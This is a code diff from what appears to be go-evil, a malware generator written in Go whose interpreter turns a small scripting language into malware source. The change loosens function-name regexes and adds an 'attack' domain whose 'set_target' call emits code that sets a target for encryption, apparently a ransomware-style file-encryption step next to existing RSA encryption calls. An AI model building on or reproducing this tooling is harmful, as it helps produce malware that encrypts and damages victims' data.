@@ -9,10 +9,10 @@ import (
 	"github.com/s9rA16Bf4/go-evil/utility/notify"
 )
 
-const EXTRACT_MAIN_FUNC = "((main ?: ?{{1,1}(?s).*}))"                          // Grabs the main function
-const EXTRACT_MAIN_FUNC_HEADER = "(main:{)"                                     // We use this to identify if there are multiple main functions in the same file
-const EXTRACT_FUNCTION_CALL = "([#a-z]+)\\.([a-z0-9]+)\\((\"(.+)\")?\\);"       // Grabs function and a potential value
-const EXTRACT_FUNCTION_CALL_WRONG = "([#a-z]+)\\.([a-z]+)\\((\"(.*)\")?\\)[^;]" // And this is utilized to find rows that don't end in ;
+const EXTRACT_MAIN_FUNC = "((main ?: ?{{1,1}(?s).*}))"                           // Grabs the main function
+const EXTRACT_MAIN_FUNC_HEADER = "(main:{)"                                      // We use this to identify if there are multiple main functions in the same file
+const EXTRACT_FUNCTION_CALL = "([#a-z]+)\\.([a-z0-9_]+)\\((\"(.+)\")?\\);"       // Grabs function and a potential value
+const EXTRACT_FUNCTION_CALL_WRONG = "([#a-z]+)\\.([a-z_]+)\\((\"(.*)\")?\\)[^;]" // And this is utilized to find rows that don't end in ;
 
 func Interpeter(file_to_read string) {
 	content := io.Read_file(file_to_read)
@@ -184,6 +184,14 @@ func Interpeter(file_to_read string) {
 			case "rsa_fetch":
 				mal.Malware_addContent("enc.RSA_get_encrypt()")
 
+			default:
+				notify.Notify_error("Unknown function '"+funct[2]+"' in domain '"+funct[1]+"'", "parser.interpreter()")
+			}
+		case "attack":
+			io.Append_domain("attack_vector")
+			switch funct[2] {
+			case "set_target":
+				mal.Malware_addContent("attack.encryption.Encrypt_set_target(\"" + funct[4] + "\")")
 			default:
 				notify.Notify_error("Unknown function '"+funct[2]+"' in domain '"+funct[1]+"'", "parser.interpreter()")
 			}
